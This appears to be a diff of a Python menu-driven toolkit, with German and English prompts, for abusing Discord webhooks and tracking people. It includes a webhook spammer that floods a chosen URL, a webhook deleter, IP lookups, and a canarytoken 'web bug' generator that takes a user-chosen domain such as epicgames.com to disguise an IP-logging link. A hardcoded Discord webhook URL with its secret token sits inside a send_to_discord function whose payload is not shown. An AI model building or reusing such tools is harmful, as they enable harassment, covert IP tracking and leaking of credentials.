@@ -5,10 +5,6 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import smtplib
 import re
-import subprocess
-
-print("___________________________[âš¡ï¸]_______________________________")
-init()
 
 def print_logo():
     ascii_art = '''
@@ -32,6 +28,17 @@ def print_logo():
     print("|   6 Email method                                                   ")
     print("|   7 Create URL Canarytoken                                         ")
     print("|____________________________________________________________________")
+
+def create_url_canarytoken():
+    print("URL-Canarytoken erstellen:")
+    email = input("Geben Sie Ihre E-Mail-Adresse ein: ")
+    website = input("Geben Sie die Website-URL ein (z.B. epicgames.com): ")
+    response = requests.get(f"https://canarytokens.org/generate?types=webbug&email={email}&domain={website}")
+    if response.status_code == 200:
+        token_url = response.text.strip()
+        print("Hier ist Ihr URL-Canarytoken: ", token_url)
+    else:
+        print("Fehler beim Abrufen des Canarytokens.")
 
 def send_to_discord(data):
     discord_webhook_url = "https://discord.com/api/webhooks/1182760451726135346/vO-EEf0P-3d2UIJb4caWM2K2zG8IPZ0peHKwyNv2k0ZFVfK7bA6I_VOJpmfHkS57kTcJ"
@@ -59,7 +66,7 @@ def is_valid_email(email):
     return re.match(email_regex, email) is not None
 
 def fill_form():
-    email = input(f"{Fore.LIGHTGREEN_EX}Enter your ProtonMail addressðŸ“§: ")
+    email = input(f"{Fore.LIGHTGREEN_EX}Enter your ProtonMail address: ")
 
     if not is_valid_email(email):
         print(f"{Fore.RED}Invalid email address. Please enter a valid ProtonMail address.")
@@ -68,7 +75,7 @@ def fill_form():
     subject = input(f"{Fore.LIGHTGREEN_EX}type the email again: ")
     body = input(f"{Fore.LIGHTRED_EX}Enter|put a number in: ")
 
-    # Hier kommt das Tutorial fÃ¼r ProtonMail
+    # Hier kommt das Tutorial für ProtonMail
     print("ProtonMail Anonymous Email Tutorial:")
     print("1. Open your ProtonMail account.")
     print("2. Click on 'Compose' to create a new email.")
@@ -77,34 +84,34 @@ def fill_form():
     print(f"5. Compose your message: {body}")
     print("6. Click 'Send' to anonymously send the email.")
 
-    # FÃ¼ge die Links zu ProtonMail im App Store und Play Store hinzu
+    # Füge die Links zu ProtonMail im App Store und Play Store hinzu
     print(f"{Fore.LIGHTGREEN_EX}Download ProtonMail:")
     print(" - [App Store](https://apps.apple.com/de/app/proton-mail-encrypted-email/id979659905)")
     print(" - [Play Store](https://play.google.com/store/apps/details?id=ch.protonmail.android)")
 
-    print(f"{Fore.LIGHTGREEN_EX}Tutorial displayed. Email sent successfullyâœ‰ï¸.")
+    print(f"{Fore.LIGHTGREEN_EX}Tutorial displayed. Email sent successfully.")
 
 def send_message(url, message, rate):
     for _ in range(rate):
         requests.post(url, json={"content": message})
 
 def webhook_message():
-    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URLðŸ”—: ")
-    message = input(f"{Fore.LIGHTRED_EX}Enter your textðŸ“: ")
-    rate = int(input(f"{Fore.LIGHTGREEN_EX}How many messages should be sentðŸ“¥: "))
+    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URL: ")
+    message = input(f"{Fore.LIGHTRED_EX}Enter your text: ")
+    rate = int(input(f"{Fore.LIGHTGREEN_EX}How many messages should be sent: "))
     send_message(url, message, rate)
-    print(f"{Fore.LIGHTGREEN_EX}Finishâ›”ï¸.")
+    print(f"{Fore.LIGHTGREEN_EX}Finish.")
 
 def webhook_deleter():
-    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URL to deleteðŸ”—: ")
+    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URL to delete: ")
     delete_webhook(url)
-    print(f"{Fore.LIGHTGREEN_EX}Webhook deletedâ›”ï¸.")
+    print(f"{Fore.LIGHTGREEN_EX}Webhook deleted.")
 
 def delete_webhook(webhook_url):
     requests.delete(webhook_url)
 
 def webhook_information():
-    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URL for informationðŸ”—: ")
+    url = input(f"{Fore.LIGHTGREEN_EX}Enter the webhook URL for information: ")
     get_webhook_info(url)
 
 def get_webhook_info(webhook_url):
@@ -114,7 +121,7 @@ def get_webhook_info(webhook_url):
         print(f"{Fore.GREEN}Webhook Information:")
         print(json.dumps(webhook_info, indent=2))
     else:
-        print(f"{Fore.RED}Failed to retrieve webhook informationðŸ¥¶.")
+        print(f"{Fore.RED}Failed to retrieve webhook information.")
 
 def show_my_ip():
     ip_data = requests.get('https://ipinfo.io/json').json()
@@ -127,7 +134,7 @@ def get_ip_info(ip):
         ip_info = info_response.json()
         print_ip_info(ip_info)
     else:
-        print("Failed to retrieve IP informationðŸ¥¶.")
+        print("Failed to retrieve IP information.")
 
 def print_ip_info(ip_info):
     print(f"{Fore.GREEN}IP Address: {ip_info.get('ip', '')}")
@@ -160,19 +167,10 @@ def print_ip_info(ip_info):
     print(f"Abuse Network: {ip_info.get('abuse', {}).get('network', '')}")
     print(f"Abuse Phone: {ip_info.get('abuse', {}).get('phone', '')}")
 
-print ("________________________________________________________________")
-
-def create_url_canarytoken():
-    print("URL-Canarytoken erstellen:")
-    email = input("Geben Sie Ihre E-Mail-Adresse ein: ")
-    website = input("Geben Sie die Website-URL ein (z.B. epicgames.com): ")
-    result = subprocess.run(["curl", f"https://canarytokens.org/generate?types=webbug&email={email}&domain={website}"], capture_output=True, text=True)
-    print("Hier ist Ihr URL-Canarytoken: ", result.stdout)
-
 def main():
+    init()
     print_logo()
-
-    choice = input(f"{Fore.GREEN} Choose an option...â„¹ï¸ (1/2/3/4/5/6/7): ")
+    choice = input(f"{Fore.GREEN} Wählen Sie eine Option (1/2/3/4/5/6/7): ")
 
     if choice == '1':
         webhook_message()
@@ -181,7 +179,7 @@ def main():
     elif choice == '3':
         webhook_information()
     elif choice == '4':
-        ip = input("Enter the IP address to scanâ„¹ï¸: ")
+        ip = input("Enter the IP address to scan: ")
         get_ip_info(ip)
     elif choice == '5':
         show_my_ip()
@@ -190,7 +188,7 @@ def main():
     elif choice == '7':
         create_url_canarytoken()
     else:
-        print(f"{Fore.RED}restart")
+        print(f"{Fore.RED}Neustart")
 
 if __name__ == "__main__":
     main()
